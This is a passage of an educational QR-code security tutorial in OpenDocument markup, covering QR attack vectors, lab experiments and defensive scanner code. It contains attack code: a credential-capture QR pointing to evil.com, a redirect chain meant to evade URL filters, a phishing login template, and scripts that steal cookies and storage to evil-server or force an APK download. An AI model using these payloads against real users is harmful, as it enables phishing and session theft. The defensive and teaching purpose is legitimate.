      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">How it works:</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/># Attacker creates a malicious login QR<text:line-break/>import qrcode<text:line-break/><text:line-break/># Legitimate login URL<text:line-break/>legit_url = "https://whatsapp.com/login?auth=legit"<text:line-break/><text:line-break/># Malicious redirect URL<text:line-break/>malicious_url = "https://evil.com/capture?redirect=" + legit_url<text:line-break/><text:line-break/># Generate QR that looks identical but captures credentials<text:line-break/>qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_H)<text:line-break/>qr.add_data(malicious_url)<text:line-break/>qr.make()</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Attack Vector 2: QR-Based Command &amp; Control (C2)</text:h>
      <text:p text:style-name="Text_20_body">Attackers use QR codes to deliver commands to malware on air-gapped systems:</text:p>
      <text:p text:style-name="P1">┌──────────────┐ <text:s text:c="3"/>┌──────────────┐ <text:s text:c="3"/>┌──────────────┐<text:line-break/>│ <text:s/>Malware on <text:s/>│ <text:s text:c="3"/>│ <text:s text:c="2"/>Screen <text:s text:c="4"/>│ <text:s text:c="3"/>│ <text:s/>Attacker <text:s text:c="3"/>│<text:line-break/>│ <text:s/>Air-Gapped <text:s/>│◄───│ <text:s/>Displays <text:s text:c="3"/>│───►│ <text:s/>Server <text:s text:c="5"/>│<text:line-break/>│ <text:s/>Computer <text:s text:c="3"/>│ <text:s text:c="3"/>│ <text:s/>QR Codes <text:s text:c="3"/>│ <text:s text:c="3"/>│ <text:s text:c="13"/>│<text:line-break/>└──────────────┘ <text:s text:c="3"/>└──────────────┘ <text:s text:c="3"/>└──────────────┘<text:line-break/> <text:s text:c="7"/>▲ <text:s text:c="18"/>▲ <text:s text:c="19"/>│<text:line-break/> <text:s text:c="7"/>│ <text:s text:c="18"/>│ <text:s text:c="19"/>│<text:line-break/> <text:s text:c="7"/>└───────────────────┴────────────────────┘<text:line-break/> <text:s text:c="17"/>Encoded Commands</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Attack Vector 3: QR Phishing (Quishing) Campaign Structure</text:h>
      <text:p text:style-name="P1">Attack Flow:<text:line-break/> <text:s/>1. Attacker creates: <text:line-break/> <text:s text:c="4"/>- Fake login page (bank, email, social media)<text:line-break/> <text:s text:c="4"/>- QR code pointing to fake page<text:line-break/> <text:s text:c="4"/><text:line-break/> <text:s/>2. Distribution channels:<text:line-break/> <text:s text:c="4"/>- Email attachments with QR images<text:line-break/> <text:s text:c="4"/>- Printed stickers on public QR codes<text:line-break/> <text:s text:c="4"/>- Social media posts with "special offer" QR<text:line-break/> <text:s text:c="4"/><text:line-break/> <text:s/>3. Harvesting:<text:line-break/> <text:s text:c="4"/>- Credentials captured in real-time<text:line-break/> <text:s text:c="4"/>- Session tokens stolen<text:line-break/> <text:s text:c="4"/>- MFA prompts forwarded to attacker</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🧪 Part 3: Practical Hands-on Experiments</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Experiment 1: Create a QR Code Redirect Chain</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Objective:</text:span> Understand how QR codes can bypass URL filters</text:p>
      <text:p text:style-name="P1">#!/usr/bin/env python3<text:line-break/># qr_redirect_chain.py<text:line-break/><text:line-break/><text:soft-page-break/>import qrcode<text:line-break/>import base64<text:line-break/>import hashlib<text:line-break/><text:line-break/>class QRRredirectionChain:<text:line-break/> <text:s text:c="3"/>def __init__(self):<text:line-break/> <text:s text:c="7"/>self.shortener_services = [<text:line-break/> <text:s text:c="11"/>"https://tinyurl.com/create.php?url=",<text:line-break/> <text:s text:c="11"/>"https://bitly.com/",<text:line-break/> <text:s text:c="11"/>"https://short.link/"<text:line-break/> <text:s text:c="7"/>]<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def create_multistage_redirect(self, final_url):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Creates multiple redirect layers to obfuscate final destination<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>stage1 = f"https://redirect.service/url={final_url}"<text:line-break/> <text:s text:c="7"/>stage2 = f"https://another.service/url={stage1}"<text:line-break/> <text:s text:c="7"/>stage3 = f"https://final.redirect/r={stage2}"<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Create QR code<text:line-break/> <text:s text:c="7"/>qr = qrcode.QRCode(version=5, error_correction=qrcode.constants.ERROR_CORRECT_H)<text:line-break/> <text:s text:c="7"/>qr.add_data(stage3)<text:line-break/> <text:s text:c="7"/>qr.make()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>img = qr.make_image(fill_color="black", back_color="white")<text:line-break/> <text:s text:c="7"/>img.save("malicious_chain_qr.png")<text:line-break/> <text:s text:c="7"/>print(f"QR created: {stage3}")<text:line-break/> <text:s text:c="7"/>return stage3<text:line-break/><text:line-break/># Demonstration<text:line-break/>test = QRRredirectionChain()<text:line-break/>test.create_multistage_redirect("https://evil-phishing.com/bank/login")</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">What you learn:</text:span> How attackers hide final destinations behind multiple redirects that security scanners may not follow.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Experiment 2: QR Code Payload Embedding</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Objective:</text:span> Hide malicious data inside QR code error correction</text:p>
      <text:p text:style-name="P1">#!/usr/bin/env python3<text:line-break/># qr_payload_embedding.py<text:line-break/><text:line-break/>import qrcode<text:line-break/>import qrcode.image.svg<text:line-break/>from PIL import Image<text:line-break/>import numpy as np<text:line-break/><text:line-break/>class QRPayloadEmbedder:<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/>Demonstrates how malware can hide data in QR error correction<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def embed_payload_in_ec(self, original_url, payload):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Uses high error correction to embed additional data<text:line-break/><text:soft-page-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/># Create base QR with high error correction<text:line-break/> <text:s text:c="7"/>qr = qrcode.QRCode(<text:line-break/> <text:s text:c="11"/>version=10,<text:line-break/> <text:s text:c="11"/>error_correction=qrcode.constants.ERROR_CORRECT_H, <text:s/># 30% recovery<text:line-break/> <text:s text:c="11"/>box_size=10,<text:line-break/> <text:s text:c="11"/>border=4<text:line-break/> <text:s text:c="7"/>)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Convert payload to base64 for embedding<text:line-break/> <text:s text:c="7"/>import base64<text:line-break/> <text:s text:c="7"/>payload_b64 = base64.b64encode(payload.encode()).decode()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Embed in QR data structure<text:line-break/> <text:s text:c="7"/># (Simplified - real implementation would be more complex)<text:line-break/> <text:s text:c="7"/>combined_data = f"{original_url}|{payload_b64}"<text:line-break/> <text:s text:c="7"/>qr.add_data(combined_data)<text:line-break/> <text:s text:c="7"/>qr.make()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return qr.make_image(fill_color="black", back_color="white")<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def extract_payload(self, qr_image_path):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Extract hidden payload from QR<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>from pyzbar.pyzbar import decode<text:line-break/> <text:s text:c="7"/>from PIL import Image<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>img = Image.open(qr_image_path)<text:line-break/> <text:s text:c="7"/>decoded = decode(img)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>if decoded:<text:line-break/> <text:s text:c="11"/>data = decoded[0].data.decode()<text:line-break/> <text:s text:c="11"/>parts = data.split('|')<text:line-break/> <text:s text:c="11"/>if len(parts) == 2:<text:line-break/> <text:s text:c="15"/>import base64<text:line-break/> <text:s text:c="15"/>payload = base64.b64decode(parts[1]).decode()<text:line-break/> <text:s text:c="15"/>return parts[0], payload<text:line-break/> <text:s text:c="7"/>return None, None<text:line-break/><text:line-break/># Demonstration<text:line-break/>embedder = QRPayloadEmbedder()<text:line-break/>qr_img = embedder.embed_payload_in_ec(<text:line-break/> <text:s text:c="3"/>"https://safe-website.com", <text:line-break/> <text:s text:c="3"/>"malware_download_url_encoded_here"<text:line-break/>)<text:line-break/>qr_img.save("embedded_payload.png")<text:line-break/>print("QR with hidden payload created")<text:line-break/><text:line-break/># Extraction simulation<text:line-break/>url, payload = embedder.extract_payload("embedded_payload.png")<text:line-break/>print(f"Extracted URL: {url}")<text:line-break/>print(f"Extracted Payload: {payload[:50]}...")</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Experiment 3: QR Code Spoofing Detection Tool</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Objective:</text:span> Create a tool to detect QR code tampering</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>#!/usr/bin/env python3<text:line-break/># qr_integrity_checker.py<text:line-break/><text:line-break/>import hashlib<text:line-break/>import qrcode<text:line-break/>from PIL import Image, ImageDraw, ImageFilter<text:line-break/>import numpy as np<text:line-break/><text:line-break/>class QRIntegrityChecker:<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/>Tool to detect if a QR code has been tampered with<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def __init__(self):<text:line-break/> <text:s text:c="7"/>self.known_patterns = {<text:line-break/> <text:s text:c="11"/>"overlay_detection": self.detect_overlay,<text:line-break/> <text:s text:c="11"/>"boundary_check": self.check_boundary_integrity,<text:line-break/> <text:s text:c="11"/>"pixel_analysis": self.analyze_pixel_anomalies<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def detect_overlay(self, qr_image_path):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Detect if a sticker has been placed over original QR<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>img = Image.open(qr_image_path).convert('L') <text:s/># Grayscale<text:line-break/> <text:s text:c="7"/>img_array = np.array(img)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check for edge discontinuities<text:line-break/> <text:s text:c="7"/>from scipy import ndimage<text:line-break/> <text:s text:c="7"/>edges = ndimage.sobel(img_array)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Look for unnatural borders in the pattern area<text:line-break/> <text:s text:c="7"/>suspicious_zones = []<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Known QR finder patterns (three squares)<text:line-break/> <text:s text:c="7"/># Check each for tampering<text:line-break/> <text:s text:c="7"/>height, width = img_array.shape<text:line-break/> <text:s text:c="7"/>pattern_zones = [<text:line-break/> <text:s text:c="11"/>(0, 0, height//7, width//7), <text:s/># Top-left<text:line-break/> <text:s text:c="11"/>(0, width - width//7, height//7, width), <text:s/># Top-right<text:line-break/> <text:s text:c="11"/>(height - height//7, 0, height, width//7) <text:s/># Bottom-left<text:line-break/> <text:s text:c="7"/>]<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>for zone in pattern_zones:<text:line-break/> <text:s text:c="11"/>y1, x1, y2, x2 = zone<text:line-break/> <text:s text:c="11"/>sub_img = img_array[y1:y2, x1:x2]<text:line-break/> <text:s text:c="11"/><text:line-break/> <text:s text:c="11"/># Check for sharp brightness changes (sticker edges)<text:line-break/> <text:s text:c="11"/>std_dev = np.std(sub_img)<text:line-break/> <text:s text:c="11"/>if std_dev &lt; 5: <text:s/># Too uniform - possible sticker<text:line-break/> <text:s text:c="15"/>suspicious_zones.append(zone)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return suspicious_zones<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def check_boundary_integrity(self, qr_image_path):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Check if QR boundaries are original<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>img = Image.open(qr_image_path)<text:line-break/><text:soft-page-break/> <text:s text:c="7"/>width, height = img.size<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Extract quiet zone<text:line-break/> <text:s text:c="7"/>quiet_zone = img.crop((0, 0, width, width//10))<text:line-break/> <text:s text:c="7"/>quiet_zone_array = np.array(quiet_zone.convert('L'))<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Quiet zone should be uniformly white (or light)<text:line-break/> <text:s text:c="7"/>if np.mean(quiet_zone_array) &lt; 240:<text:line-break/> <text:s text:c="11"/>return "QUIET_ZONE_COMPROMISED"<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check for color inconsistencies<text:line-break/> <text:s text:c="7"/>if img.mode == 'RGB':<text:line-break/> <text:s text:c="11"/>colors = img.getcolors(maxcolors=1000)<text:line-break/> <text:s text:c="11"/>if len(colors) &gt; 50: <text:s/># Too many colors - possible tampering<text:line-break/> <text:s text:c="15"/>return "ABNORMAL_COLOR_COUNT"<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return "INTEGRITY_PASSED"<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def analyze_pixel_anomalies(self, qr_image_path):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Detect pixel-level anomalies<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>img = Image.open(qr_image_path).convert('RGB')<text:line-break/> <text:s text:c="7"/>img_array = np.array(img)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check for compression artifacts suggesting manipulation<text:line-break/> <text:s text:c="7"/># Re-save and compare<text:line-break/> <text:s text:c="7"/>img.save("/tmp/compare.png", "PNG")<text:line-break/> <text:s text:c="7"/>img2 = Image.open("/tmp/compare.png")<text:line-break/> <text:s text:c="7"/>img2_array = np.array(img2)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>diff = np.abs(img_array - img2_array)<text:line-break/> <text:s text:c="7"/>if np.sum(diff) &gt; 1000:<text:line-break/> <text:s text:c="11"/>return "COMPRESSION_ANOMALY"<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return "PASS"<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def full_scan(self, qr_path):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Run all detection methods<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>results = {}<text:line-break/> <text:s text:c="7"/>for name, method in self.known_patterns.items():<text:line-break/> <text:s text:c="11"/>results[name] = method(qr_path)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return results<text:line-break/><text:line-break/># Demonstration<text:line-break/>checker = QRIntegrityChecker()<text:line-break/>results = checker.full_scan("test_qr.png")<text:line-break/>print("Integrity Scan Results:")<text:line-break/>for test, result in results.items():<text:line-break/> <text:s text:c="3"/>print(f" <text:s/>{test}: {result}")</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Experiment 4: QR Phishing Simulation (Ethical)</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Objective:</text:span> Set up a controlled environment to understand quishing</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>#!/bin/bash<text:line-break/># phishing_qr_lab_setup.sh<text:line-break/># WARNING: ONLY FOR CONTROLLED LAB ENVIRONMENT<text:line-break/><text:line-break/>echo "=== QR Phishing Simulation Lab Setup ==="<text:line-break/>echo "This creates an isolated testing environment"<text:line-break/><text:line-break/># Create isolated network namespace<text:line-break/>sudo ip netns add qr_lab<text:line-break/><text:line-break/># Create virtual ethernet pair<text:line-break/>sudo ip link add veth0 type veth peer name veth1<text:line-break/><text:line-break/># Move one end to namespace<text:line-break/>sudo ip link set veth1 netns qr_lab<text:line-break/><text:line-break/># Configure IP addresses<text:line-break/>sudo ip addr add 10.0.0.1/24 dev veth0<text:line-break/>sudo ip netns exec qr_lab ip addr add 10.0.0.2/24 dev veth1<text:line-break/><text:line-break/># Bring interfaces up<text:line-break/>sudo ip link set veth0 up<text:line-break/>sudo ip netns exec qr_lab ip link set veth1 up<text:line-break/>sudo ip netns exec qr_lab ip link set lo up<text:line-break/><text:line-break/># Setup DNS in namespace<text:line-break/>sudo ip netns exec qr_lab echo "nameserver 8.8.8.8" &gt; /etc/resolv.conf<text:line-break/><text:line-break/># Start a fake phishing server in the namespace<text:line-break/>sudo ip netns exec qr_lab python3 -m http.server 80 &amp;<text:line-break/><text:line-break/>echo "Lab ready for QR phishing experiments"</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Experiment 5: QR Malware Delivery Simulation</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Objective:</text:span> Understand how malware delivers via QR codes</text:p>
      <text:p text:style-name="P1">#!/usr/bin/env python3<text:line-break/># qr_malware_simulator.py<text:line-break/># WARNING: DEMONSTRATION ONLY - DO NOT DEPLOY MALICIOUSLY<text:line-break/><text:line-break/>import qrcode<text:line-break/>import sqlite3<text:line-break/>import datetime<text:line-break/>import hashlib<text:line-break/>import json<text:line-break/>from urllib.parse import urlparse<text:line-break/><text:line-break/>class QRMalwareSimulator:<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/>Demonstrates malware delivery techniques via QR<text:line-break/> <text:s text:c="3"/>FOR EDUCATIONAL PURPOSES ONLY<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def __init__(self):<text:line-break/> <text:s text:c="7"/>self.payload_types = {<text:line-break/> <text:s text:c="11"/>"credential_harvester": self.create_phishing_page,<text:line-break/> <text:s text:c="11"/>"drive_by_download": self.create_downloader,<text:line-break/><text:soft-page-break/> <text:s text:c="11"/>"session_hijacker": self.create_session_stealer<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def create_phishing_page(self, target_site):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Generate a QR that leads to a fake login page<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>html_template = f"""<text:line-break/> <text:s text:c="7"/>&lt;!DOCTYPE html&gt;<text:line-break/> <text:s text:c="7"/>&lt;html&gt;<text:line-break/> <text:s text:c="7"/>&lt;head&gt;&lt;title&gt;{target_site} - Secure Login&lt;/title&gt;&lt;/head&gt;<text:line-break/> <text:s text:c="7"/>&lt;body&gt;<text:line-break/> <text:s text:c="11"/>&lt;form action="/capture" method="POST"&gt;<text:line-break/> <text:s text:c="15"/>&lt;input type="text" name="username" placeholder="Email/Username"&gt;<text:line-break/> <text:s text:c="15"/>&lt;input type="password" name="password" placeholder="Password"&gt;<text:line-break/> <text:s text:c="15"/>&lt;input type="submit" value="Login"&gt;<text:line-break/> <text:s text:c="11"/>&lt;/form&gt;<text:line-break/> <text:s text:c="11"/>&lt;script&gt;<text:line-break/> <text:s text:c="15"/>// Track if form is submitted<text:line-break/> <text:s text:c="15"/>document.querySelector('form').onsubmit = function(e) {{<text:line-break/> <text:s text:c="19"/>console.log('Credentials captured');<text:line-break/> <text:s text:c="15"/>}};<text:line-break/> <text:s text:c="11"/>&lt;/script&gt;<text:line-break/> <text:s text:c="7"/>&lt;/body&gt;<text:line-break/> <text:s text:c="7"/>&lt;/html&gt;<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Generate QR for the fake page URL<text:line-break/> <text:s text:c="7"/>qr = qrcode.QRCode(box_size=10, border=4)<text:line-break/> <text:s text:c="7"/>qr.add_data(f"http://evil-server/{target_site}/login")<text:line-break/> <text:s text:c="7"/>qr.make()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return qr.make_image(fill_color="black", back_color="white")<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def create_session_stealer(self, target_app):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>QR that steals session tokens<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>steal_script = """<text:line-break/> <text:s text:c="7"/>&lt;script&gt;<text:line-break/> <text:s text:c="11"/>// Steal cookies and tokens<text:line-break/> <text:s text:c="11"/>fetch('http://evil-server/steal', {<text:line-break/> <text:s text:c="15"/>method: 'POST',<text:line-break/> <text:s text:c="15"/>body: JSON.stringify({<text:line-break/> <text:s text:c="19"/>cookies: document.cookie,<text:line-break/> <text:s text:c="19"/>localStorage: localStorage,<text:line-break/> <text:s text:c="19"/>sessionStorage: sessionStorage,<text:line-break/> <text:s text:c="19"/>url: window.location.href<text:line-break/> <text:s text:c="15"/>})<text:line-break/> <text:s text:c="11"/>});<text:line-break/> <text:s text:c="7"/>&lt;/script&gt;<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>return steal_script<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def create_downloader(self, payload_url):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>QR that triggers malicious download<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>download_code = f"""<text:line-break/><text:soft-page-break/> <text:s text:c="7"/>&lt;script&gt;<text:line-break/> <text:s text:c="11"/>// Auto-download when page loads<text:line-break/> <text:s text:c="11"/>window.onload = function() {{<text:line-break/> <text:s text:c="15"/>var link = document.createElement('a');<text:line-break/> <text:s text:c="15"/>link.href = '{payload_url}';<text:line-break/> <text:s text:c="15"/>link.download = 'update.apk';<text:line-break/> <text:s text:c="15"/>link.click();<text:line-break/> <text:s text:c="11"/>}};<text:line-break/> <text:s text:c="7"/>&lt;/script&gt;<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>return download_code<text:line-break/><text:line-break/># Demonstration<text:line-break/>sim = QRMalwareSimulator()<text:line-break/>phishing_qr = sim.create_phishing_page("secure-bank.com")<text:line-break/>phishing_qr.save("phishing_demo.png")<text:line-break/>print("Generated QR leads to fake login page")</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🛡️ Part 4: Advanced Defensive Techniques</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Defense Layer 1: Client-Side QR Scanner with Security Checks</text:h>
      <text:p text:style-name="P1">#!/usr/bin/env python3<text:line-break/># secure_qr_scanner.py<text:line-break/><text:line-break/>import cv2<text:line-break/>from pyzbar.pyzbar import decode<text:line-break/>import requests<text:line-break/>import tldextract<text:line-break/>import re<text:line-break/>from urllib.parse import urlparse<text:line-break/><text:line-break/>class SecureQRScanner:<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/>QR scanner with built-in security analysis<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def __init__(self):<text:line-break/> <text:s text:c="7"/>self.suspicious_patterns = [<text:line-break/> <text:s text:c="11"/>r"(?i)(login|signin|verify|authenticate)",<text:line-break/> <text:s text:c="11"/>r"(?i)(update|download|install)",<text:line-break/> <text:s text:c="11"/>r"(?i)(bank|paypal|amazon)",<text:line-break/> <text:s text:c="11"/>r"(?i)(confirm|validate|secure)"<text:line-break/> <text:s text:c="7"/>]<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>self.blocked_domains = set()<text:line-break/> <text:s text:c="7"/>self.load_blocklist()<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def load_blocklist(self):<text:line-break/> <text:s text:c="7"/>"""Load known phishing domains"""<text:line-break/> <text:s text:c="7"/>try:<text:line-break/> <text:s text:c="11"/># Download from public blocklists<text:line-break/> <text:s text:c="11"/>response = requests.get("https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts")<text:line-break/> <text:s text:c="11"/>for line in response.text.splitlines():<text:line-break/> <text:s text:c="15"/>if line.startswith("0.0.0.0") or line.startswith("127.0.0.1"):<text:line-break/><text:soft-page-break/> <text:s text:c="19"/>parts = line.split()<text:line-break/> <text:s text:c="19"/>if len(parts) &gt;= 2:<text:line-break/> <text:s text:c="23"/>self.blocked_domains.add(parts[1])<text:line-break/> <text:s text:c="7"/>except:<text:line-break/> <text:s text:c="11"/>print("Using local blocklist")<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def analyze_url(self, url):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Perform security analysis on URL<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>results = {<text:line-break/> <text:s text:c="11"/>"is_safe": True,<text:line-break/> <text:s text:c="11"/>"warnings": [],<text:line-break/> <text:s text:c="11"/>"risk_score": 0<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>parsed = urlparse(url)<text:line-break/> <text:s text:c="7"/>domain = parsed.netloc<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check against blocklist<text:line-break/> <text:s text:c="7"/>if domain in self.blocked_domains:<text:line-break/> <text:s text:c="11"/>results["is_safe"] = False<text:line-break/> <text:s text:c="11"/>results["warnings"].append(f"Domain {domain} is blocked")<text:line-break/> <text:s text:c="11"/>results["risk_score"] += 50<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check for IP address URLs<text:line-break/> <text:s text:c="7"/>if re.match(r'\d+\.\d+\.\d+\.\d+', domain):<text:line-break/> <text:s text:c="11"/>results["warnings"].append("URL uses IP address instead of domain name")<text:line-break/> <text:s text:c="11"/>results["risk_score"] += 30<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check URL length (suspiciously long)<text:line-break/> <text:s text:c="7"/>if len(url) &gt; 200:<text:line-break/> <text:s text:c="11"/>results["warnings"].append("Unusually long URL")<text:line-break/> <text:s text:c="11"/>results["risk_score"] += 20<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check for suspicious patterns<text:line-break/> <text:s text:c="7"/>for pattern in self.suspicious_patterns:<text:line-break/> <text:s text:c="11"/>if re.search(pattern, url):<text:line-break/> <text:s text:c="15"/>results["warnings"].append(f"Suspicious keyword: {pattern}")<text:line-break/> <text:s text:c="15"/>results["risk_score"] += 15<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check for URL shorteners<text:line-break/> <text:s text:c="7"/>url_shorteners = ['bit.ly', 'tinyurl', 'goo.gl', 'ow.ly', 'is.gd', 'buff.ly']<text:line-break/> <text:s text:c="7"/>for shortener in url_shorteners:<text:line-break/> <text:s text:c="11"/>if shortener in domain:<text:line-break/> <text:s text:c="15"/>results["warnings"].append(f"URL shortened by {shortener}")<text:line-break/> <text:s text:c="15"/>results["risk_score"] += 25<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># High risk threshold<text:line-break/> <text:s text:c="7"/>if results["risk_score"] &gt;= 70:<text:line-break/> <text:s text:c="11"/>results["is_safe"] = False<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return results<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def scan_qr(self, image_path):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Full QR scan with security analysis<text:line-break/><text:soft-page-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/># Decode QR<text:line-break/> <text:s text:c="7"/>img = cv2.imread(image_path)<text:line-break/> <text:s text:c="7"/>decoded_objects = decode(img)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>if not decoded_objects:<text:line-break/> <text:s text:c="11"/>return {"error": "No QR code found"}<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>qr_data = decoded_objects[0].data.decode()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Check if it's a URL<text:line-break/> <text:s text:c="7"/>if qr_data.startswith(("http://", "https://")):<text:line-break/> <text:s text:c="11"/>analysis = self.analyze_url(qr_data)<text:line-break/> <text:s text:c="11"/>return {<text:line-break/> <text:s text:c="15"/>"type": "URL",<text:line-break/> <text:s text:c="15"/>"data": qr_data,<text:line-break/> <text:s text:c="15"/>"security": analysis,<text:line-break/> <text:s text:c="15"/>"qr_details": {<text:line-break/> <text:s text:c="19"/>"type": decoded_objects[0].type,<text:line-break/> <text:s text:c="19"/>"rect": decoded_objects[0].rect<text:line-break/> <text:s text:c="15"/>}<text:line-break/> <text:s text:c="11"/>}<text:line-break/> <text:s text:c="7"/>else:<text:line-break/> <text:s text:c="11"/># Non-URL content check<text:line-break/> <text:s text:c="11"/>return {<text:line-break/> <text:s text:c="15"/>"type": "DATA",<text:line-break/> <text:s 